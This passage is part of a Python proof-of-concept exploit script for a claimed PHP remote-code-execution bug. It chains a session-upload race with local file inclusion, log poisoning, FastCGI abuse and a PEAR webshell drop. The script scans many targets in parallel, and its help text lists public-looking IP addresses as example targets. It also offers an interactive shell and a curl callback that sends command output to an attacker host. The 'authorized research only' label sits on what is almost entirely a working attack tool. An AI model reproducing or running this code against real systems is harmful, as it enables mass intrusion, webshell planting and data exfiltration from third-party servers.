                    for tmpl in sess_templates:
                        out = _ifire(host, port, path, use_tls, session_id,
                                     tmpl.format(sid=session_id), p,
                                     verify, cafile)
                        if out is not None:
                            _LFI_TELEMETRY.update({"param": p, "tmpl": tmpl})
                            got = out
                            break
                    if got is not None:
                        break
                if got is None:
                    time.sleep(0.03)

            stop_event.set()
            up_thread.join(timeout=6)
            if got is not None:
                break
            else:
                if attempt < attempts:
                    print(f"    [Attempt {attempt}/{attempts}] window missed -- retrying")

        print(cgreen(got.strip()) if got else cred("[!] no output"))


# ─── detection / probe ───────────────────────────────────────────────────────

def probe(host: str, port: int, path: str, use_tls: bool) -> dict:
    """
    Stage 0: fingerprint — confirm target runs PHP and session.upload_progress is active.
    Returns dict with keys: php, upload_progress_writable, server.
    """
    result = {"php": False, "upload_progress_writable": False, "server": ""}

    scheme = "https" if use_tls else "http"
    url = f"{scheme}://{host}:{port}{path}"
    req = urllib.request.Request(url)
    req.add_header("User-Agent", "Mozilla/5.0")
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            headers = dict(r.headers)
            result["server"] = headers.get("Server", headers.get("server", ""))
            powered = headers.get("X-Powered-By", headers.get("x-powered-by", ""))
            if "php" in powered.lower() or "php" in result["server"].lower():
                result["php"] = True
            result["php_version"] = parse_php_version(powered)
            if result["php_version"] is None:
                result["php_version"] = parse_php_version(result["server"])
    except Exception:
        pass

    # Probe session.upload_progress: send a multipart with PHP_SESSION_UPLOAD_PROGRESS
    # and check if the server echoes any session header or sets a PHPSESSID cookie.
    key = "php2shellProbe"
    body = build_multipart_body(key, pad_fields=0)
    content_length = len(body)
    try:
        s = make_socket(host, port, use_tls)
        req_bytes = (
            f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Content-Length: {content_length}\r\nConnection: close\r\n\r\n"
        ).encode()
        s.sendall(req_bytes + body)
        s.settimeout(5)
        resp = b""
        try:
            while True:
                d = s.recv(4096)
                if not d:
                    break
                resp += d
        except socket.timeout:
            pass
        s.close()
        resp_str = resp.decode(errors="replace")
        if "PHPSESSID" in resp_str or "set-cookie" in resp_str.lower():
            result["upload_progress_writable"] = True
        if "php" in resp_str.lower() and not result["php"]:
            result["php"] = True
    except Exception:
        pass

    return result


# ─── LFI trigger ─────────────────────────────────────────────────────────────

def try_lfi(host: str, port: int, path: str, use_tls: bool,
            session_id: str, lfi_param: Optional[str] = None,
            verify: bool = True, cafile: Optional[str] = None) -> Optional[str]:
    """
    Attempt to include the poisoned session file via LFI.
    Tries explicit lfi_param first, then probes LFI_PARAMS on path, then
    tries session path directly appended to URL base.
    Returns extracted command output or None.
    """
    scheme = "https" if use_tls else "http"
    base = f"{scheme}://{host}:{port}"

    # strip query from path for LFI param injection
    path_base = path.split("?")[0]

    params_to_try = ([lfi_param] if lfi_param else []) + LFI_PARAMS

    for sess_tmpl in SESSION_PATHS:
        sess_file = sess_tmpl.format(sid=session_id)
        for param in params_to_try:
            url = f"{base}{path_base}?{param}={urllib.parse.quote(sess_file)}"
            req = urllib.request.Request(url)
            req.add_header("Cookie", f"PHPSESSID={session_id}")
            req.add_header("User-Agent", "Mozilla/5.0")
            if use_tls and not verify:
                import ssl as _ssl
                ctx = _ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = _ssl.CERT_NONE
            else:
                ctx = None
            try:
                opener = urllib.request.build_opener(
                    urllib.request.HTTPSHandler(context=ctx) if (use_tls and ctx) else urllib.request.HTTPHandler()
                )
                with opener.open(req, timeout=8) as r:
                    body = r.read().decode(errors="replace")
                    out = extract_output(body)
                    if out is not None:
                        _LFI_TELEMETRY["param"] = param
                        _LFI_TELEMETRY["tmpl"] = sess_tmpl
                        return out
            except Exception:
                pass

    return None


# ─── main exploit loop ───────────────────────────────────────────────────────

def exploit(host: str, port: int, path: str, use_tls: bool,
            command: str = "id",
            rounds: int = 5, modes: str = "all",
            chunk_size: int = 512, chunk_delay: float = 0.005,
            lfi_param: Optional[str] = None,
            verify: bool = True, cafile: Optional[str] = None,
            interactive: bool = False,
            callback: Optional[str] = None) -> None:

    # blind RCE: wrap command in OOB curl exfil when --callback provided
    effective_cmd = command
    if callback:
        effective_cmd = (
            f"curl -sk '{callback}?o=$({command} 2>&1|base64 -w0)'"
        )
        print(f"[*] Blind RCE mode — output exfil to: {callback}")

    print(f"[*] Target : {'https' if use_tls else 'http'}://{host}:{port}{path}")
    print(f"[*] Command: {command}")
    print(f"[*] Rounds : {rounds}  Modes: {modes}  Chunk: {chunk_size}B @ {chunk_delay}s delay")
    if not verify:
        print(cyel("[!] WARNING: TLS verification disabled — MITM risk"))

    # stage 0: probe + session-path auto-detect
    print("[*] Stage 0: probing target...")
    info = probe(host, port, path, use_tls)
    detected_path = detect_session_path(host, port, path, use_tls)
    if detected_path:
        print(f"    session.save_path detected: {detected_path}")
        if f"{detected_path}/sess_{{sid}}" not in SESSION_PATHS:
            SESSION_PATHS.insert(0, f"{detected_path}/sess_{{sid}}")

    # auto-discover LFI params from page HTML if none given
    if not lfi_param:
        discovered = discover_lfi_params(host, port, path, use_tls)
        if discovered:
            print(f"    LFI params discovered: {discovered[:6]}")
            # extend LFI_PARAMS with discovered candidates (prepend)
            for d in reversed(discovered):
                if d not in LFI_PARAMS:
                    LFI_PARAMS.insert(0, d)
    print(f"    Server      : {info['server'] or '(unknown)'}")
    print(f"    PHP detected: {info['php']}")
    print(f"    upload_prog : {info['upload_progress_writable']}")
    if not info["php"] and not info["upload_progress_writable"]:
        print("[!] Target does not appear to run PHP — proceeding anyway.")

    crashes = 0
    cmd_output: Optional[str] = None

    for r in range(1, rounds + 1):
        print(f"\n[*] Round {r}/{rounds}")

        # stage 1: acquire session ID, build poisoned upload key
        session_id = get_session_id(host, port, path, use_tls) or uuid.uuid4().hex
        upload_key  = poison_payload(effective_cmd)
        print(f"    PHPSESSID : {session_id}")

        stop_event = threading.Event()
        results: list = []

        # stage 2: disturber — concurrent session lifecycle disturbance
        disturber_thread = threading.Thread(
            target=session_disturber,
            args=(host, port, path, use_tls, session_id, upload_key, stop_event, results, modes),
            daemon=True
        )
        disturber_thread.start()

        lfi_result: list = []

        # stage 3: slow upload in background — keeps session entry alive during upload
        upload_done = threading.Event()
        def _upload():
            c = slow_upload(
                host, port, path, use_tls,
                session_id, upload_key,
                chunk_size=chunk_size,
                chunk_delay=chunk_delay,
                stop_event=stop_event,
                verify=verify, cafile=cafile,
            )
            if c:
                crashes_list.append(1)
            upload_done.set()
        crashes_list: list = []
        upload_thread = threading.Thread(target=_upload, daemon=True)
        upload_thread.start()

        # stage 4: LFI trigger fires repeatedly while upload streams
        # wait briefly for PHP to write session entry, then hammer LFI
        time.sleep(0.3)
        lfi_attempts = 0
        while not upload_done.is_set() and not lfi_result:
            out = try_lfi(host, port, path, use_tls, session_id,
                          lfi_param=lfi_param, verify=verify, cafile=cafile)
            lfi_attempts += 1
            if out is not None:
                lfi_result.append(out)
                break
            time.sleep(0.05)

        stop_event.set()
        upload_thread.join(timeout=10)
        disturber_thread.join(timeout=5)

        if crashes_list:
            crashes += 1
            print(cyel(cbold("    [!!!] 5xx / connection reset — potential UAF trigger")))

        if lfi_result:
            cmd_output = lfi_result[0]
            print(f"\n{cgreen(cbold(f'[+] COMMAND OUTPUT (round {r}, {lfi_attempts} LFI attempts):'))}")
            print(cdim('─' * 60))
            print(cmd_output.strip())
            print(cdim('─' * 60))
            break

        hits_5xx = [x for x in results if isinstance(x, tuple) and len(x) >= 2 and x[1] == 500]
        print(f"    Disturbance: {len(results)} events | LFI attempts: {lfi_attempts} | no output")

    if cmd_output is None:
        print(f"\n[*] Session LFI failed — trying log poisoning...")
        cmd_output = try_log_poison(host, port, path, use_tls, effective_cmd,
                                    lfi_param=lfi_param, verify=verify, cafile=cafile)
        if cmd_output:
            print(cgreen(cbold("\n[+] COMMAND OUTPUT (log poison):")))
            print(cdim('─' * 60))
            print(cmd_output.strip())
            print(cdim('─' * 60))

    if cmd_output is None:
        print(f"\n[*] Log poison failed — trying FastCGI direct (no-LFI)...")
        # re-poison session with fresh SID for fastcgi path
        _fpm_sid = uuid.uuid4().hex
        _fpm_key = poison_payload(effective_cmd)
        _fpm_stop = threading.Event()
        _fpm_t = threading.Thread(
            target=slow_upload,
            args=(host, port, path, use_tls, _fpm_sid, _fpm_key),
            kwargs=dict(chunk_size=chunk_size, chunk_delay=chunk_delay,
                        stop_event=_fpm_stop, verify=verify, cafile=cafile),
            daemon=True
        )
        _fpm_t.start()
        time.sleep(0.3)
        cmd_output = try_fastcgi_rce(host, port, path, _fpm_sid, effective_cmd)
        _fpm_stop.set()
        _fpm_t.join(timeout=5)
        if cmd_output:
            print(cgreen(cbold("\n[+] COMMAND OUTPUT (fastcgi direct):")))
            print(cdim('─' * 60))
            print(cmd_output.strip())
            print(cdim('─' * 60))

    if cmd_output is None:
        print(f"\n[*] FastCGI failed — trying PEAR webshell drop...")
        cmd_output = try_pear_webshell(host, port, path, use_tls, effective_cmd,
                                       lfi_param=lfi_param, verify=verify, cafile=cafile)
        if cmd_output:
            print(cgreen(cbold("\n[+] COMMAND OUTPUT (pear webshell):")))
            print(cdim('─' * 60))
            print(cmd_output.strip())
            print(cdim('─' * 60))

    print(f"\n[=] Done. Rounds: {rounds}  Crash indicators: {crashes}/{rounds}")
    if cmd_output is not None:
        print(cgreen(cbold("[+] RCE confirmed.")))
        if interactive and lfi_param and cmd_output:
            interactive_shell(host, port, path, use_tls, lfi_param,
                              detected_path, chunk_size, chunk_delay, verify, cafile)
        return True
    else:
        print(cred("[-] No command output extracted. Possible causes:"))
        print("    - No LFI on target (try --lfi-param <param>)")
        print("    - session.upload_progress.enabled=0")
        print("    - PHP already patched (8.2.35+/8.3.36+/8.4.27+/8.5.12+)")
        print("    - WAF blocking multipart or PHP_SESSION_UPLOAD_PROGRESS")
        if crashes:
            print(f"    - UAF crash indicators seen ({crashes}x) — LFI path missing, not the bug")
        return False


# ─── CLI ─────────────────────────────────────────────────────────────────────

def main():
    print_banner()
    p = argparse.ArgumentParser(
        description="PHP2Shell CVE-2026-109618/109619 PoC — authorized research only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "multi-target:\n"
            "  cat targets.txt | python3 poc.py 'id' --no-verify\n"
            "  cat targets.txt | python3 poc.py --probe-only      # fingerprint sweep only\n"
            "  python3 poc.py --targets targets.txt 'id' --workers 4\n"
            "  python3 poc.py --targets targets.txt --probe-only -w 8 --no-verify\n"
            "\n"
            "single target:\n"
            "  python3 poc.py http://target/index.php\n"
            "  python3 poc.py http://target/index.php 'id'\n"
            "  python3 poc.py http://target/page.php 'cat /etc/passwd' --lfi-param page\n"
            "  python3 poc.py http://target/ 'whoami' --rounds 20 --chunk-delay 0.001\n"
            "  python3 poc.py https://target/ 'id' --no-verify\n"
            "\n"
            "colors: enabled on a tty -- NO_COLOR=1 disables, FORCE_COLOR=1 forces\n"
            "targets file format: one URL/IP per line, '#' comments allowed:\n"
            "  https://133.130.74.159\n"
            "  http://161.246.35.202:8080/app/\n"
            "  # this line is ignored\n"
        )
    )
    p.add_argument("url",     nargs="?", default=None,
                   help="Target PHP URL, e.g. http://192.168.1.10/index.php "
                        "(omit when piping targets via stdin or --targets)")
    p.add_argument("command", nargs="?", default=None,
                   help="OS command to execute (default: id)")
    p.add_argument("--targets", "-T", default=None, metavar="FILE",
                   help="File with one target URL per line (alternative to stdin pipe)")
    p.add_argument("--workers", "-w", type=int, default=4, metavar="N",
                   help="Parallel targets for multi-target run (default: 4; 1 = sequential)")
    p.add_argument("--lfi-param", default=None, metavar="PARAM",
                   help="Known LFI parameter name to inject session file path (e.g. page)")
    p.add_argument("--rounds", type=int, default=5,
                   help="Race rounds (default: 5)")
    p.add_argument("--modes", default="all",
                   help="Disturbance modes: all | destroy,regenerate,gc,double,abort (default: all)")
    p.add_argument("--chunk-size", type=int, default=512,
                   help="Upload chunk bytes (default: 512)")
    p.add_argument("--chunk-delay", type=float, default=0.005,
                   help="Delay between chunks in seconds (default: 0.005)")
    p.add_argument("--probe-only", action="store_true",
                   help="Fingerprint only, no exploit")
    p.add_argument("--no-verify", action="store_true",
                   help="Disable TLS certificate verification (lab/self-signed only — MITM risk)")
    p.add_argument("--cafile", default=None,
                   help="Path to CA bundle for TLS verification")
    p.add_argument("--interactive", "-i", action="store_true",
                   help="Drop into interactive shell after first successful RCE "
                        "(single target + --lfi-param only)")
    p.add_argument("--callback", default=None, metavar="URL",
                   help="Blind RCE: exfiltrate output OOB via curl to URL (e.g. http://attacker.com/x)")
    args = p.parse_args()

    # ─── collect targets: positional arg + --targets file + piped stdin ──────
    raw_targets: list[str] = []
    if args.targets:
        try:
            with open(args.targets) as f:
                raw_targets += f.read().splitlines()
        except OSError as e:
            print(f"[-] Cannot read targets file: {e}")
            sys.exit(1)
    elif not sys.stdin.isatty():
        raw_targets += sys.stdin.read().splitlines()
    # UX: with a target list from stdin/file, a single bare positional is the
    # COMMAND, matching `cat targets.txt | poc.py 'id'`:
    if (args.url and args.command is None
            and (args.targets or not sys.stdin.isatty())):
        if ';' in args.url or ' ' in args.url or '.' not in args.url.split('/')[0]:
            args.command, args.url = args.url, None
    args.command = args.command or 'id'
    if args.url:
        raw_targets.append(args.url)

    targets = normalize_targets(raw_targets)
    if not targets:
        p.error("the following arguments are required: url "
                "(or pipe a targets list via stdin, or use --targets FILE)")

    if args.interactive and len(targets) > 1:
        print(cyel("[!] --interactive ignored in multi-target mode"))
        args.interactive = False

    def run_one(idx: int, tgt: str) -> tuple:
        """Run probe or exploit against one target. Returns (url, rce_ok)."""
        parsed = urllib.parse.urlparse(tgt)
        use_tls = parsed.scheme == "https"
        host = parsed.hostname
        port = parsed.port or (443 if use_tls else 80)
        path = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query

        if args.probe_only:
            info = probe(host, port, path, use_tls)
            sig = info["php"] or info["upload_progress_writable"]
            vlabel, vvuln = php_version_verdict(info.get("php_version"))
            verdict = (cgreen("VULN-SURFACE") if sig else cred("NOT-VULN    "))
            vmark = (cred(cbold(vlabel)) if vvuln
                     else cgreen(vlabel) if "PATCHED" in vlabel
                     else cdim(vlabel))
            print(f"[{idx:>3}] {verdict} {vmark:<70}  "
                  f"upl={int(info['upload_progress_writable'])}  "
                  f"server={info['server'][:36] or '-':36s}  {cbold(tgt)}")
            return tgt, sig

        print(f"\n{cdim('═' * 74)}\n{ccyan(cbold(f'[{idx}] TARGET: {tgt}'))}\n{cdim('═' * 74)}")
        try:
            ok = exploit(
                host, port, path, use_tls,
                command=args.command,
                rounds=args.rounds,
                modes=args.modes,
                chunk_size=args.chunk_size,
                chunk_delay=args.chunk_delay,
                lfi_param=args.lfi_param,
                verify=not args.no_verify,
                cafile=args.cafile,
                interactive=args.interactive,
                callback=args.callback,
            )
        except KeyboardInterrupt:
            raise
        except Exception as e:
            print(f"[{idx}] [-] Target error: {e}")
            ok = False
        return tgt, ok

    # ─── probe-only sweep: fast fingerprint across all targets ───────────────
    if args.probe_only:
        print(f"[*] Probe sweep: {len(targets)} targets "
              f"({'threads=' + str(args.workers) if args.workers > 1 else 'sequential'}) "
              f"- PHP version flagging enabled (CVE-2026-109618)")
        results: list[tuple] = []
        if args.workers > 1:
            with ThreadPoolExecutor(max_workers=args.workers) as ex:
                futures = [ex.submit(run_one, i + 1, t) for i, t in enumerate(targets)]
                for fut in as_completed(futures):
                    results.append(fut.result())
        else:
            for i, t in enumerate(targets, 1):
                results.append(run_one(i, t))

        hits = [t for t, ok in results if ok]
        print(f"\n{cdim('═' * 74)}\n{ccyan('[=] PROBE SUMMARY')} — "
              f"{cgreen(cbold(f'{len(hits)}/{len(results)} VULNERABLE')) if hits else cred(cbold(f'{len(hits)}/{len(results)} vulnerable'))} "
              f"(PHP session.upload_progress surface)")
        for t in hits:
            print(f"    {cgreen('HIT :')} {cbold(t)}")
        if hits:
            print("[*] Re-run hits without --probe-only to attempt full chain, e.g.:")
            print(f"    printf '%s\\n' {' '.join(shlex.quote(h) for h in hits)} "
                  f"| python3 {sys.argv[0]} 'id' --no-verify")
        return

    # ─── exploit single target: unchanged behavior ───────────────────────────
    if len(targets) == 1 or args.interactive:
        _, ok = run_one(1, targets[0])
        sys.exit(0 if ok else 1)

    # ─── exploit multi-target: parallel workers, summary at end ──────────────
    print(ccyan(f"[*] Multi-target run: {len(targets)} targets | '{args.command}' | "
          f"workers={args.workers} | rounds={args.rounds}"))
    results = []
    if args.workers > 1:
        with ThreadPoolExecutor(max_workers=args.workers) as ex:
            futures = [ex.submit(run_one, i + 1, t) for i, t in enumerate(targets)]
            for fut in as_completed(futures):
                results.append(fut.result())
    else:
        for i, t in enumerate(targets, 1):
            results.append(run_one(i, t))

    confirmed = [t for t, ok in results if ok]
    print(f"\n{cdim('═' * 74)}")
    if confirmed:
        print(f"{ccyan('[=] FINAL SUMMARY')} — "
              f"{cgreen(cbold(f'{len(confirmed)}/{len(results)} RCE CONFIRMED'))} "
              f"(command: '{args.command}')")
    else:
        print(f"{ccyan('[=] FINAL SUMMARY')} — "
              f"{cred(cbold(f'{len(confirmed)}/{len(results)} RCE confirmed'))} "
              f"(command: '{args.command}')")
    print(cdim('═' * 74))
    for t, ok in results:
        mark = cgreen(cbold("[+] RCE    ")) if ok else cred("[-] no-out ")
        print(f"  {mark} {cbold(t)}")
    if confirmed:
        print(ccyan("[*] Next steps on confirmed targets:"))
        print(f"    interactive : python3 {sys.argv[0]} {confirmed[0]} --interactive "
              f"--lfi-param <param> --no-verify")
        print(f"    blind exfil : python3 {sys.argv[0]} <url> 'id' "
              f"--callback http://YOUR_HOST:port/path --no-verify")
    sys.exit(0 if confirmed else 1)


def normalize_targets(raw: list) -> list:
    """Strip comments/blank lines, add default scheme, collapse duplicates."""
    seen: set = set()
    out = []
    for t in raw:
        t = t.split("#", 1)[0].strip()
        if not t:
            continue
        if not urllib.parse.urlparse(t).scheme:
            t = "http://" + t
        if t.rstrip("/") not in seen:
            seen.add(t.rstrip("/"))
            out.append(t)
    return out


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Interrupted — exit")
        sys.exit(130)
